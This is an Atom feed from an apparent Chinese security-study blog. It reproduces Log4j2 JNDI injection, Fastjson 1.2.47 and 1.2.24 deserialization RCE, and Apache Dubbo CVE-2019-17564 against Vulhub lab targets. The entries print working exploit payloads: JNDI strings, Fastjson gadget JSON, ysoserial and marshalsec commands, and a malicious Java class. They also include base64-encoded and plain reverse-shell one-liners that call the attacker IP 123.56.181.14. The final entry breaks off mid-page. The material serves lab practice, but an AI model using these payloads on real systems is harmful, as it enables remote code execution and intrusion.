<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Su.</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2023-10-29T11:54:24.487Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>biobby</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228</title>
    <link href="http://yoursite.com/2023/09/10/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2021-44228/"/>
    <id>http://yoursite.com/2023/09/10/Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228/</id>
    <published>2023-09-10T13:00:50.000Z</published>
    <updated>2023-10-29T11:54:24.487Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228"><a href="#Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228" class="headerlink" title="Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228"></a>Apache Log4j2 lookup JNDI 注入漏洞 CVE-2021-44228</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>${jndi:ldap://evil.com/example}</code>的lookup用于进行JNDI注入，执行任意代码。</p><blockquote><p><strong>Apache Log4j2</strong> 是一个 Java 的日志管理工具，是 Log4j 的升级版本</p></blockquote><blockquote><p><strong>JNDI</strong>（Java Naming and Directory Interface）是 Java 平台提供的一种命名和目录服务接口，用于在 Java 应用程序中访问各种命名和目录服务，如 DNS、LDAP、RMI 注册表等。JNDI 提供了统一的方式来访问这些服务，使得 Java 应用程序能够更方便地与外部资源进行交互。</p><p><strong>JNDI 注入漏洞</strong>是指攻击者通过恶意构造的输入参数，绕过应用程序的安全机制，将攻击者控制的恶意对象注入到 JNDI 上下文中，从而导致应用程序在使用 JNDI 服务时执行恶意操作或获取敏感信息。</p><p>JNDI 注入漏洞通常出现在使用 JNDI 进行资源查找和连接时，攻击者通过在输入参数中插入特定的 JNDI URL 或其他恶意信息，来欺骗应用程序使用攻击者指定的资源。具体攻击方式可能因应用程序的不同而有所差异。</p></blockquote><blockquote><p>在 JNDI（Java Naming and Directory Interface）中，<strong>lookup</strong> 是指通过名称查找资源、对象或上下文。</p><p>JNDI 提供了一种机制，使得我们可以通过名称来访问和获取各种命名和目录服务中的资源。<strong>lookup 操作</strong>是 JNDI 中的一项基本操作，通过指定一个唯一的名称或路径，我们可以在 JNDI 上下文中查找并获取与该名称相关联的资源。</p><p>lookup 操作的具体步骤如下：</p><ol><li>获取 JNDI 初始上下文（Initial Context）：通常使用 <code>InitialContext</code> 类的实例来表示。</li><li>调用 <code>lookup()</code> 方法：使用 JNDI 上下文的 <code>lookup()</code> 方法来执行查找操作。该方法接收一个名称参数，指定要查找的资源或对象的名称。</li><li>处理查找结果：<code>lookup()</code> 方法返回一个对象，表示与给定名称相关联的资源，根据具体情况进行处理。如果找到匹配的资源，我们可以将其类型转换为我们所需的类型，并使用该资源进行后续操作。</li></ol></blockquote><p>参考链接：</p><ul><li><a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/security.html</a></li><li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" target="_blank" rel="noopener">https://www.lunasec.io/docs/blog/log4j-zero-day/</a></li><li><a href="https://xz.aliyun.com/t/10649" target="_blank" rel="noopener">https://xz.aliyun.com/t/10649</a></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Apache Log4j2 不是一个特定的Web服务，而仅仅是一个第三方库，我们可以通过找到一些使用了这个库的应用来复现这个漏洞，比如Apache Solr。</p><p>Vulhub执行如下命令启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8983</code>即可查看到Apache Solr的后台页面。</p><ul><li>Apache Solr 是一个基于 Apache Lucene 的开源搜索平台，主要用于构建强大的全文搜索、分布式搜索和数据分析应用。</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><code>${jndi:ldap://${sys:java.version}.example.com}</code>是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值，发送如下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1</span><br><span class="line">Host: your-ip:8983</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910210522752.png" alt="image-20230910210522752"></p><p>我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910210642364.png" alt="image-20230910210642364"></p><p>实际利用JNDI注入漏洞，可以使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">这个工具</a>。</p><p>若利用工具，要确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用。</p><p>需要把生成的 JNDI链接注入到存在漏洞的应用环境中</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md</a></p><p>得到工具jar包</p><ul><li><p>把源码下载到本地然后自行编译打包。（在Java1.7+ 、Java1.8+ 和 Maven 3.x+环境下测试可以）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git</span><br><span class="line">$ cd JNDI-Injection-Exploit</span><br><span class="line">$ mvn clean package -DskipTests</span><br></pre></td></tr></table></figure></li></ul><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214122074.png" alt="image-20230910214122074"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar /root/vulhub-tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br><span class="line">-C &quot;touch /tmp/awesoe_oc&quot; -A &quot;123.56.181.14&quot;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910215040184.png" alt="image-20230910215040184"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214233218.png" alt="image-20230910214233218"></p><p>利用完毕后，可见<code>touch /tmp/awesome_oc</code>已经成功被执行：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910213939887.png" alt="image-20230910213939887"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>若出现端口已被占用问题，可逐一检查<strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口，杀死相关占用进程</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214508372.png" alt="image-20230910214508372"></p><p>  构造反弹shell命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /root/vulhub-tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;123.56.181.14&quot;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214650226.png" alt="image-20230910214650226"></p><p>  <img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214740245.png" alt="image-20230910214740245"></p><p>攻击机监听4444端口，上述请求包发送后，接收反弹shell：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230910214913343.png" alt="image-20230910214913343"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228&quot;&gt;&lt;a href=&quot;#Apache-Log4j2-lookup-JNDI-注入漏洞-CVE-2021-44228&quot; class=&quot;headerlink&quot; title=&quot;Ap
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Java反序列化" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson 1.2.47 远程命令执行漏洞</title>
    <link href="http://yoursite.com/2023/09/05/Fastjson%201.2.47%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2023/09/05/Fastjson 1.2.47 远程命令执行漏洞/</id>
    <published>2023-09-05T08:00:50.000Z</published>
    <updated>2023-10-29T11:55:57.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li><li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个spring web项目，其中使用fastjson作为默认json解析器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/fastjson/1.2.47-rce/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8090</code>即可看到一个json对象被返回，我们将content-type修改为<code>application/json</code>后可向其POST新的JSON对象，后端会利用fastjson进行解析。</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905203858855.png" alt="image-20230905203858855" style="zoom:50%;"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码，如<code>http://123.56.181.14:8888/TouchFile.class</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;bash&quot;, &quot;-c&quot;,&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.174.128/9999;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br></pre></td></tr></table></figure><p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p>向靶场服务器发送Payload（此处的Payload和Fastjson 1.2.24不同）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://123.56.181.14:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205607237.png" alt="image-20230905205607237"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205623200.png" alt="image-20230905205623200"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905205714157.png" alt="image-20230905205714157"></p><p>监听4444端口，接收反弹shell：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905210217935.png" alt="image-20230905210217935"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Fastjson-1-2-47-远程命令执行漏洞&quot;&gt;&lt;a href=&quot;#Fastjson-1-2-47-远程命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;Fastjson 1.2.47 远程命令执行漏洞&quot;&gt;&lt;/a&gt;Fastjson 1.2.4
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</title>
    <link href="http://yoursite.com/2023/09/05/Aapche%20Dubbo%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/"/>
    <id>http://yoursite.com/2023/09/05/Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）/</id>
    <published>2023-09-05T06:00:50.000Z</published>
    <updated>2023-10-29T11:54:39.324Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h1><p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。RPC，全称为Remote Procedure Call，即远程过程调用，它是一个计算机通信协议。它允许像调用本地服务一样调用远程服务。</p><p>Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Dubbo 2.7.4及以前版本</span><br></pre></td></tr></table></figure><p>Apache Dubbo 2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个Apache Dubbo 2.7.3 Provider：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/dubbo/CVE-2019-17564/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8080</code>，服务器默认会返回500错误。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p><p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，本地下载<a href="https://zookeeper.apache.org/" target="_blank" rel="noopener">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器。</p><p>依次执行以下命令下载、解压、使用zkCli工具：</p><blockquote><p>记得把2181加入安全组，所有ip都能访问</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://dlcdn.apache.org/zookeeper/zookeeper-3.7.1/apache-zookeeper-3.7.1-bin.tar.gz --no-check-certificate</span><br><span class="line">或者</span><br><span class="line">wget https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ tar xvf apache-zookeeper-3.7.0-bin.tar.gz</span><br><span class="line">$ cd apache-zookeeper-3.7.0-bin/bin</span><br><span class="line">$ ./zkCli.sh -server target-ip:2181</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905150644982.png" alt="image-20230905150644982"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905150745040.png" alt="image-20230905150745040"></p><p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905153725509.png" alt="image-20230905153725509"></p><p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;touch /tmp/awesome_poc&quot; &gt; 1.poc</span><br><span class="line"></span><br><span class="line">$ curl -XPOST --data-binary @1.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905154734165.png" alt="image-20230905154734165"></p><p>进入docker，命令<code>touch /tmp/awesome_poc</code>执行成功：</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905154826790.png" alt="image-20230905154826790"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.56.181.14/4444 0&gt;&amp;1</span><br><span class="line"># base64编码</span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar ysoserial-master-2874a69f61-1.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTYuMTgxLjE0LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; shell.poc</span><br><span class="line">$ curl -XPOST --data-binary @shell.poc http://123.56.181.14:8080/org.vulhub.api.CalcService</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905160303151.png" alt="image-20230905160303151"></p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905155920271.png" alt="image-20230905155920271"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）&quot;&gt;&lt;a href=&quot;#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）&quot; class=&quot;headerlink&quot; title=&quot;Aapche Dubbo J
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Java反序列化" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson 1.2.24 反序列化导致任意命令执行漏洞</title>
    <link href="http://yoursite.com/2023/09/05/Fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2023/09/05/Fastjson 1.2.24 反序列化导致任意命令执行漏洞/</id>
    <published>2023-09-05T06:00:50.000Z</published>
    <updated>2023-10-29T11:55:39.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#Fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="Fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>Fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><blockquote><p>Fastjson 是一个功能强大、高性能的 JSON 处理库，适用于各种 Java 应用程序，并提供了简便的 API 来处理 JSON 数据。无论是简单的序列化和反序列化，还是复杂的数据转换和处理，Fastjson 都是一个值得考虑的选择</p></blockquote><p>参考资料：</p><ul><li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li><li><a href="">[http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/](](http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/</a><a href="http://xxlegend.com/2017/04/29/title-" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-</a> fastjson 远程反序列化poc的构造和分析/)</li></ul><p>fastjson标识</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905192524794.png" alt="image-20230905192524794" style="zoom:50%;"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub运行测试环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/fastjson/1.2.24-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境运行后，访问<code>http://your-ip:8090</code>即可看到JSON格式的输出。</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905192058005.png" alt="image-20230905192058005" style="zoom:50%;"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p><p>首先编译并上传命令执行代码，如<code>http://evil.com/TouchFile.class</code>：</p><p>1.执行<code>javac TouchFile.java</code>，生成<code>TouchFile.class</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">#TouchFile.java内容如下</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905193227159.png" alt="image-20230905193227159"></p><p>2.通过python搭建一个临时的web服务，该服务是为了接收LDAP服务重定向请求，需要在payload的目录下开启此web服务，这样才可以访问到payload文件。此处payload文件即<code>TouchFile.class</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8888</span><br></pre></td></tr></table></figure><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905193816969.png" alt="image-20230905193816969" style="zoom:67%;"></p><p>3.借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://123.56.181.14:8888/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p>再开一个窗口，连接vps，执行命令</p><p><img src="D:\app\有道云笔记\笔记\漏洞复现练习\images\image-20230905194335821.png" 